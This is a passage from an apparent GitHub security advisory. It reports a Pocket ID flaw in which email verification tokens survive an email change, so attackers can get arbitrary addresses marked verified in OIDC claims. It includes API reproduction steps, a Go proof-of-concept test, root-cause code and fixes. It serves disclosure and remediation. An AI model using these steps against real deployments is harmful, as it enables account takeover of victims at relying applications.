d only to the user ID, not to the address to which it was sent, and changing the address does not revoke outstanding tokens. \n As a result, Pocket ID marks the newly supplied address as verified even though the user never proved control of it. Pocket ID subsequently returns that address with email_verified: true in OIDC claims. A relying party that trusts this claim for email-based account linking or provisioning can therefore link the attacker's Pocket ID identity to a victim's existing account, leading to cross-application account takeover. \n I reproduced this against commit 9f559788a44cfea790de360da0a74d4bdf8ca5d5 . \n Preconditions \n \n The attacker has an ordinary Pocket ID user account. \n Email verification is in use ( emailsVerified=false , which is the default). \n The user can edit their own account ( allowOwnAccountEdit=true , which is the default). \n The target address is not already assigned to another Pocket ID user. \n For downstream account takeover, a relying party links or provisions users based on a trusted, verified email address. Applications that rely exclusively on the stable OIDC sub claim are not affected by that downstream consequence. \n \n No administrator privilege, victim interaction, or access to the victim's mailbox is required. \n Reproduction through the API \n \n Sign in as an ordinary user whose current email address is controlled by the attacker, for example attacker@example.test . \n Call POST /api/users/me/send-email-verification . \n Obtain the token from the message delivered to attacker@example.test , but do not redeem it yet. \n Call PUT /api/users/me and change the account email to an address the attacker does not control, for example victim@example.test . \n Observe that the new address is initially stored with emailVerified: false . \n Call POST /api/users/me/verify-email with the token delivered to attacker@example.test . \n Call GET /api/users/me . The current address is now victim@example.test and emailVerified is true . \n Complete an OIDC flow with the email scope. Pocket ID emits: \n \n {\n \"email\" : \" victim@example.test \" ,\n \"email_verified\" : true \n} \n The old token has therefore verified a different address from the one to which it was delivered. \n Executable regression test / proof of concept \n Save this as backend/internal/service/audit_email_verification_test.go and run: \n go test -tags=exclude_frontend,unit ./internal/service -run TestAuditEmailVerificationTokenSurvivesEmailChange -count=1 -v\n \n The test passes on the referenced commit and demonstrates the unintended state transition: \n package service\n\n import (\n \"testing\" \n \"time\" \n\n \"github.com/stretchr/testify/require\" \n\n \"github.com/pocket-id/pocket-id/backend/internal/appconfig\" \n \"github.com/pocket-id/pocket-id/backend/internal/dto\" \n \"github.com/pocket-id/pocket-id/backend/internal/model\" \n\tdatatype \"github.com/pocket-id/pocket-id/backend/internal/model/types\" \n)\n\n func TestAuditEmailVerificationTokenSurvivesEmailChange ( t * testing. T ) {\n userService , _ := newTestUserService ( t )\n config := & appconfig. AppConfigModel {\n RequireUserEmail : \"true\" ,\n AllowOwnAccountEdit : \"true\" ,\n EmailsVerified : \"false\" ,\n\t}\n\n attackerEmail := \"attacker-controlled@example.test\" \n user , err := userService . CreateUser ( t . Context (), config , dto. UserCreateDto {\n Username : \"attacker\" ,\n Email : & attackerEmail ,\n EmailVerified : false ,\n\t})\n require . NoError ( t , err )\n\n const tokenFromAttackerMailbox = \"token-issued-for-attacker-email\" \n require . NoError ( t , userService . db . Create ( & model. EmailVerificationToken {\n UserID : user . ID ,\n Token : tokenFromAttackerMailbox ,\n ExpiresAt : datatype . DateTime ( time . Now (). Add ( time . Hour )),\n\t}). Error )\n\n victimEmail := \"victim@example.test\" \n _ , err = userService . UpdateUser ( t . Context (), config , user . ID , dto. UserCreateDto {\n Username : user . Username ,\n Email : & victimEmail ,\n\t}, true , false )\n require . NoError ( t , err )\n\n changed , err := userService . GetUser ( t . Context (), user . ID )\n require . NoError ( t , err )\n require . Equal ( t , victimEmail , * changed . Email )\n require . False ( t , changed . EmailVerified )\n\n require . NoError ( t , userService . VerifyEmail (\n t . Context (),\n user . ID ,\n tokenFromAttackerMailbox ,\n\t))\n\n verified , err := userService . GetUser ( t . Context (), user . ID )\n require . NoError ( t , err )\n require . Equal ( t , victimEmail , * verified . Email )\n require . True ( t , verified . EmailVerified )\n} \n Observed result: \n === RUN TestAuditEmailVerificationTokenSurvivesEmailChange\n--- PASS: TestAuditEmailVerificationTokenSurvivesEmailChange\nPASS\n \n Root cause \n backend/internal/model/email_verification_token.go stores only a token, expiration, and user ID. It does not store or cryptographically bind the address being verified. \n UserService.SendEmailVerification creates the token for user.ID and sends it to the current user.Email , but that email is not part of the token record: \n emailVerificationToken := & model. EmailVerificationToken {\n UserID : user . ID ,\n Token : randomToken ,\n ExpiresAt : datatype . DateTime ( expiration ),\n} \n UserService.UpdateUser resets the verification flag when the address changes but leaves existing verification tokens valid. \n UserService.VerifyEmail validates only the token, user ID, and expiry, then sets EmailVerified on the user's current record: \n err := tx . WithContext ( ctx ). Where (\n \"token = ? AND user_id = ? AND expires_at > ?\" ,\n token ,\n userID ,\n datatype . DateTime ( time . Now ()),\n). First ( & emailVerificationToken ). Error \n\n user , err := s . getUserInternal ( ctx , emailVerificationToken . UserID , tx )\n // ... \n user . EmailVerified = true \n Finally, backend/internal/oidc/claims_service.go publishes the current address and flag together: \n claims [ \"email\" ] = * user . Email \n claims [ \"email_verified\" ] = user . EmailVerified \n Impact \n The direct impact is an authentication-integrity failure in an identity provider: any ordinary user can cause Pocket ID to attest control of an arbitrary unused email address. \n The security boundary crossed by that false attestation is the relying application. Where a relying party treats email_verified=true as proof of address ownership and uses email for automatic account matching, the attacker can be signed into or linked to the victim's existing relying-party account. This can expose all data and actions available through that account. \n Suggested CVSS 3.1 vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N (9.6, Critical). \n Suggested remediation \n \n Store a normalized target email address (or a keyed hash of it) with every verification token. \n During redemption, atomically require that the stored target address still equals the user's current normalized email address. \n Invalidate all outstanding email-verification tokens whenever the account email changes. \n Invalidate prior outstanding tokens when issuing a replacement token. \n Add a regression test that changes the email after issuance and requires the old token to be rejected. \n \n Testing note \n Source review and test construction were AI-assisted. The finding, affected control flow, preconditions, and executable proof of concept were validated against the referenced Pocket ID commit before submission. \n \n \n\n \n\n \n \n\n\n\n\n\n \n\n \n \n Severity \n \n \n Critical\n \n\n \n \n \n 9.6 \n \n \n\n \n \n \n \n \n \n CVSS overall score\n \n \n \n \n \n \n \n \n \n \n This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS). \n \n \n \n \n / 10 \n \n \n CVSS v3 base metrics \n\n \n Attack vector\n Network \n \n Attack complexity\n Low \n \n Privileges required\n Low \n \n User interaction\n None \n \n Scope\n Changed \n \n Confidentiality\n High \n \n Integrity\n High \n \n Availability\n None \n \n \n \n Learn more about base metrics \n \n \n\n \n \n \n \n \n \n CVSS v3 base metrics\n \n \n \n \n \n \n \n \n \n \n \n \n Attack vector: \n More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability. \n \n \n Attack complexity: \n More severe for the least complex attacks. \n \n \n Privileges required: \n More severe if no privileges are required. \n \n \n User interaction: \n More severe when no user interaction is required. \n \n \n Scope: \n More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope. \n \n \n Confidentiality: \n More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user. \n \n \n Integrity: \n More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user. \n \n \n Availability: \n More severe when the loss of impacted component availability is highest. \n \n \n \n \n \n \n \n CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N \n\n \n\n \n \n CVE ID \n \n CVE-2026-115770\n \n \n\n \n Weaknesses \n \n \n Weakness \n CWE-345 \n \n \n \n Insufficient Verification of Data Authenticity \n The product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.\n Learn more on MITRE. \n\n \n \n\n \n\n \n Credits \n\n \n \n \n \n \n nexicturbo \n\n \n Reporter \n\n \n\n \n\n \n \n\n\n\n\n \n\n \n \n\n\n \n\n \n\n \n \n\n \n Footer \n\n \n\n\n \n \n \n \n \n \n &copy; 2026 GitHub, Inc.\n \n \n\n \n Footer navigation \n\n \n\n\n \n Terms \n \n\n \n Privacy \n \n\n\n \n Security \n \n\n \n Status \n \n\n \n Community \n \n\n \n Docs \n \n\n \n Contact \n \n\n \n \n \n \n Manage cookies\n \n \n \n\n \n \n \n Do not share my personal information\n \n \n \n\n \n \n \n \n\n\n\n \n\n\n\